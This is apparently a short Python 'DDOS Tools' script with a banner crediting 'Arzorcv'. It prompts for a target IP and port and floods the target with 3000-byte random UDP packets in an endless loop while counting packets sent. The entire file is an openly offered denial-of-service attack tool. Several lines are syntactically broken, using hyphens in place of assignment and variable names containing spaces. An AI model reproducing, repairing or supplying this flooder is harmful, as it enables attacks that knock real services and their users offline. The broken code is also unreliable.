import socket 
import random 
import os 
os.system("clear")
banner="""
##########################################
#Coder-byArzorcv                       #
#DDOS Tools                           #
######################################

""" 
print(banner)
target_ip-raw-input("target ip:   ")
target_port-raw-input("target port:    ")
bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

counter=0
while True:
    sock.sendto(bytes,(target ip,target port)) 
    counter=counter+1
    print ("The attack has started, the number of packages:%s"%(counter))